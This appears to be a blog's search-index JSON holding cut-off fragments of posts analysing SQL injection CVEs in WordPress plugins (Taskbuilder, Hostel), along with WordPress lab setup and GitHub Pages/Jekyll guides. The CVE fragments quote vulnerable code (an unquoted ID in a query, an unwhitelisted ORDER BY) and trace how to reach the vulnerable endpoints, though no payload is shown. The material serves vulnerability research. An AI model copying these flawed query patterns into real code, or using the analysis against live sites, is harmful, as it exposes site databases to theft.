rest_api_init($wp_rest_server) { $args = [ 'method' =\u003e WP_REST_Server::READABLE, 'callback' =\u003e [$this, 'rest_route_callback_quote'], 'permission_callback' =\u003e '__return_true' ]; register_rest_route('layart/v1', '/quote', $args); // other logic $args['callback'] = [$this, 'rest_route_callback_font_variants']; register_rest_route('layart/v1', '/font-variants', $args); } // other functions function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u003eget_param('family'); $family = isset($family) ? $family : \"Shadows Into Light\"; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } The constructor of Quot","date":"2025-09-23","objectID":"/posts/2025-09-23-cve-2025-26943/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/posts/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Taskbuilder Plugin.","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information. CVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions Analysis The application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability. Patch Diff Use any diff tool to compare differences between the vulnerable version and the patched version. The clear difference is in the file includes/admin/projects/get_users.php. In version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = $proj_id\" ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = '$proj_id'\" ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection. Patch diff How It Works File Architecture: General structure of the current file: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row(\"SELECT * FROM {$wpdb-\u003eprefix}wppm_project WHERE id = $proj_id\"); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ 'body' =\u003e $body, 'footer' =\u003e $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it‚Äôs called from another feature. To find where it‚Äôs used, search for get_users.php in the plugin directory. Search get users üëâ It is included in the function wppm_get_users() of the class WPPM_Admin in class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook. WPPM_Admin constructor: final class WPPM_Admin { public function __construct() { // other actions add_action( 'wp_ajax_wppm_get_users', array($this,'wppm_get_users')); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook. wp_ajax_wppm_get_users is an Ajax hook name: wp_ajax_{action} ‚Üí handles Ajax for logged-in users. wp_ajax_nopriv_{action} ‚Üí handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users(). üëâ Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin. Ajax search The wppm_get_users action is the data part in the POST request handled by wppm_get_users(). The function is referenced in HTML attributes of the project feature: Create a new project Access that project Inspect code to locate wppm_get_users and see which actions call it Ajax inspect üëâ Clicking the","date":"2025-09-22","objectID":"/posts/2025-09-22-cve-2025-39569/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/posts/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analyst"],"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration. CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient. Patch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php Vulnerable version: if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } Patched version: if(!empty($_GET['ob'])) { $ob = sanitize_text_field($_GET['ob']); if(!in_array($ob, ['tB.id', 'tB.contact_name', 'tB.contact_email', 'tB.from_date', 'tB.amount_paid', 'tB.status'])) { $ob = 'tB.id'; } $orderby = \"ORDER BY $ob $dir\"; } üëâ The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'. Analysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context. How it works To inject, we need to identify the complete query used here: $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); The query resides in the default branch of the switch structure. All this logic belongs to the static manage() method of the WPHostelBookings class. class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { case 'add': // add handle break; case 'edit': // edit handle break; // view/print booking details. Will allow also to confirm/cancel case 'view': // view handle break; // list bookings default: // another logic if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \"manage\" in the plugin folder. Search In the file models/hostel.php we have: class class WPHostel { // another logic static function menu() { // we use 'hostelpro_manage' for consistency with the pro version $wphostel_caps = current_user_can('manage_options') ? 'manage_options' : 'hostelpro_manage'; add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __('Settings', 'wphostel'), __('Settings', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __(\"Manage Rooms\", 'wphostel'), __(\"Manage Rooms\", 'wphostel'), $wphostel_caps, 'wphostel_rooms', array('WPHostelRooms', \"manage\")); add_submenu_page('wphostel_options', __(\"Manage Bookings\", 'wphostel'), __(\"Manage Bookings\", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', \"manage\")); add_submenu_page('wphostel_options', __(\"Unavailable Dates\", 'wphostel'), __(\"Unavailable Dates\", ","date":"2025-09-21","objectID":"/posts/2025-09-21-cve-2025-39566/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/posts/2025-09-21-cve-2025-39566/"},{"categories":["Web"],"content":"A powerful and the most popular content management system (CMS).","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Web"],"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to easily create, manage, and customize websites and blogs. It is an open-source CMS, built on PHP and using either MySQL or MariaDB. Released in 2003, initially just for blogging, then evolved into a platform for building websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress: WordPress.com Hosting service provided by Automattic You just register an account, no installation needed Limited customization; advanced features require payment WordPress.org Open source, you download and install it on your own hosting/server Fully customizable: install plugins, themes, write code, and build any type of website Ecosystem Core: the main CMS Plugins: add-on software that extends WordPress functionality with new features Themes: add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024 Most Popular Currently, more than 40% of websites worldwide run on WordPress This means hackers only need to find one common vulnerability =\u003e they can exploit millions of sites at once Similar to the saying: ‚Äúfish where the fish are‚Äù Plugins and Themes WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it very difficult for attackers to compromise directly. However, there are tens of thousands of plugins and themes from various sources with inconsistent quality. Many plugins have poor security coding and are outdated. Hackers just need to scan for outdated versions and exploit them. Setup WordPress for Hacking There are many ways to set up WordPress; searching Google will provide plenty of guides. Here I will set it up on an Ubuntu (22.04) virtual machine: Does not affect real machine services WordPress is relatively lightweight and works well on a VM Install and Configure WordPress Install Dependencies Install the full stack required to run WordPress (web server + database + PHP + important extensions): sudo apt install -y apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source into the web directory: # Create folder to store site source code sudo mkdir -p /srv/www # Change ownership to www-data (default user for Apache/Nginx) sudo chown www-data: /srv/www # Download the latest WordPress package and extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Download a specific version: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable and safest approach: Ubuntu has a wordpress package in its repository, but it is often outdated compared to the official release. The WordPress community only supports installations from the official source. Configure Apache for WordPress Create \u0026 edit /etc/apache2/sites-available/wordpress.conf: sudo nano /etc/apache2/sites-available/wordpress.conf Paste the following content in: \u003cVirtualHost *:80\u003e DocumentRoot /srv/www/wordpress \u003cDirectory /srv/www/wordpress\u003e Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u003c/Directory\u003e \u003cDirectory /srv/www/wordpress/wp-content\u003e Options FollowSymLinks Require all granted \u003c/Directory\u003e \u003c/VirtualHost\u003e Enable the site: sudo a2ensite wordpress Enable rewrite module: sudo a2enmod rewrite (Optional) Disable default site: sudo a2dissite 000-default Reload Apache: sudo service apache2 reload Configure Database sudo mysql -u root CREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY '\u003cyour-password\u003e'; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit ","date":"2025-08-21","objectID":"/posts/2025-08-21-wordpress-local-and-debugging/:0:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/posts/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Web"],"content":"How to create your personal blog using Github Pages with \"comment\" feature","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"When starting a personal blog, there are three tools you should know: GitHub Pages, Jekyll, and Giscus. Github Pages: A free service from GitHub that allows you to deploy static websites directly from a repository. Just push your code to GitHub, and your blog will automatically go live on the Internet without needing your own server. Jekyll: A static site generator integrated with GitHub Pages. Jekyll makes it easy to create blogs from Markdown files, organize content using templates, and apply ready-to-use themes. Giscus: A modern comment system based on GitHub Discussions. Instead of using external services like Disqus, you can leverage GitHub to manage comments, keeping it lightweight and developer-friendly. Requirements A Github account Basic knowledge of Markdown Creating a Site Repository Here, I use the Chirpy theme, a popular theme for GitHub Pages optimized for personal or technical blogging. Steps: Log in to Github and go to the starter. Instead of forking, click Use this template and select Create a new repository to automatically create a Site Repository. Name the new repository \u003cusername\u003e.github.io, replacing \u003cusername\u003e with your GitHub username. Setting up the Environment There are two main reasons to set up a local development environment for your blog: After pushing code to the repository, GitHub Actions takes time to run before building and rendering the site on GitHub Pages. By developing directly on your local machine, you can see changes instantly‚Äîfaster and more convenient. Using Dev Containers (Recommended for Windows) Dev Containers provide an isolated environment via Docker, preventing conflicts with your system and ensuring all dependencies are managed inside the container. Steps: Install Docker: On Windows/macOS: install Docker Desktop. On Linux: install Docker Engine. Install VS Code and the Dev Containers extension. Clone the repository: If using Docker Desktop: open VS Code and clone the repo in a container volume. If using Docker Engine: clone the repo locally, then open it in a container in VS Code. Wait for the Dev Containers setup process to complete. Setting up Natively (Recommended for Unix-like OS) For Unix-like systems (Linux, macOS), you can set up the environment directly (natively) for better performance. Dev Containers are still available as an alternative. Steps: Follow the Jekyll installation guide and ensure Git is installed. Clone the repository locally. If you forked the theme, install Node.js and run bash tools/init.sh in the root folder to initialize the repo. Run the following commands in the root folder to install gems into ./vendor/bundle/ within the project‚Äîno need for sudo and no changes to /var/lib/gems.. bundle config set --local path 'vendor/bundle' bundle install Usage Start the Jekyll Server To run the site locally, use: bundle exec jekyll s Configuration Some variables to configure in _config.yml include: lang: set the website language url: your website URL title: main title shown under the avatar tagline: subtitle or site description avatar: supports local and CORS resources, including gif Comment feature via Giscus We‚Äôll use Giscus as the comment system. Other free alternatives include Disqus and Utterances. Steps: Install giscus on GitHub. In your repository Settings, go to General and enable Discussions so giscus can store comments. Enter the repository name \u003cusername\u003e/\u003cusername\u003e.github.io. A green checkmark will appear when requirements are met. Choose the discussion category and topic for your site. Configure giscus in _config.yml: provider: set to giscus giscus: map the variables you set on giscus to the giscus section Customize the Favicon Create a custom favicon for your website instead of using the theme‚Äôs default. Steps: Go to Favicon Generator. Click Browse to select your favicon file, then Create Favicon. Click Download the generated favicon to get the files. Extract the downloaded file and delete these two: browserconfig.xml site.webmanifest Copy the rema","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:0:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"}]